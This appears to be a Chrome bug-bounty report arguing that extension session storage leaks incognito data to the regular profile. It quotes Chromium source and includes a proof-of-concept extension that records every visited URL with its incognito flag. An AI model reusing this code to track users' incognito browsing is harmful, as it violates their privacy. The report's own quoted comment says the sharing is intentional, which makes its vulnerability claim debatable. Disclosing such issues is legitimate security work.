# Chrome VRP Report: Extension Session Storage Leaks Incognito Data to Regular Profile

## Summary

The `chrome.storage.session` API shares a single storage backend between incognito and regular browser profiles. Data written by an extension in incognito mode is directly readable from the regular profile context, violating user expectations of incognito privacy.

## Vulnerability Details

**Component:** `extensions/browser/api/storage/session_storage_manager.cc`
**Lines:** 53-58

```cpp
content::BrowserContext* SessionStorageManagerFactory::GetBrowserContextToUse(
    content::BrowserContext* browser_context) const {
  // Share storage between incognito and on-the-record profiles by using the
  // original context of an incognito window.
  return ExtensionsBrowserClient::Get()->GetContextRedirectedToOriginal(
      browser_context);
}
```

The `GetBrowserContextToUse` method explicitly redirects incognito BrowserContext to the regular profile's context. This means all `chrome.storage.session` operations in incognito use the same underlying storage as the regular profile.

## Steps to Reproduce

### 1. Create a test extension

**manifest.json:**
```json
{
  "name": "Incognito Storage Leak PoC",
  "version": "1.0",
  "manifest_version": 3,
  "permissions": ["storage"],
  "incognito": "spanning",
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"]
  }]
}
```

**background.js:**
```javascript
chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg.type === "store") {
    chrome.storage.session.set({
      [`visit_${Date.now()}`]: {
        url: msg.url,
        incognito: sender.tab.incognito,
        timestamp: new Date().toISOString()
      }
    });
  } else if (msg.type === "dump") {
    chrome.storage.session.get(null, (data) => {
      console.log("All session storage (from regular window):", data);
      // This will include entries written in incognito!
    });
  }
});
```

**content.js:**
```javascript
chrome.runtime.sendMessage({
  type: "store",
  url: window.location.href
});
```

### 2. Test the leak

1. Install the extension
2. Open an incognito window and visit `https://example.com`
3. The extension's content script stores the visit with `incognito: true`
4. In the regular browser window, click the extension icon or trigger the "dump" message
5. **Observe:** The incognito visit appears in the regular window's session storage dump

### Expected Behavior

Data written to `chrome.storage.session` in incognito should NOT be accessible from the regular profile context.

### Actual Behavior

All session storage data is shared between incognito and regular contexts because they share the same underlying `SessionStorageManager` instance.

## Impact

1. **Incognito Privacy Violation**: Extensions can trivially exfiltrate incognito browsing data to the regular profile, defeating the user's expectation of privacy.

2. **No Special Permissions Required**: Only the `storage` permission is needed, which is one of the most common extension permissions and does not trigger special warnings.

3. **Spanning Mode by Default**: Extensions in spanning mode (the default for MV3) have a single service worker that receives events from both regular and incognito contexts, making this trivial to exploit.

4. **Persistent Exfiltration**: A malicious extension can continuously log incognito activity and make it available in the regular profile for later extraction.

## Affected Versions

All Chrome versions with `chrome.storage.session` API support.

## Severity Assessment

**Medium** — This violates a fundamental user expectation of incognito mode. The comment in the source code acknowledges the sharing is intentional but this creates a clear privacy gap that users are not informed about. The attack requires only a malicious extension with the `storage` permission.

## Comparison with Other Storage APIs

- `chrome.storage.local` and `chrome.storage.sync` have similar context-sharing behavior, but `session` storage is particularly concerning because it's ephemeral — users expect session-scoped data to be especially isolated.
- IndexedDB and other web platform storage APIs properly isolate data between incognito and regular profiles.

## Suggested Fix

`SessionStorageManagerFactory::GetBrowserContextToUse` should return the incognito BrowserContext as-is (not redirect to original), maintaining separate session storage instances for each profile. This matches the isolation behavior of web platform storage APIs.
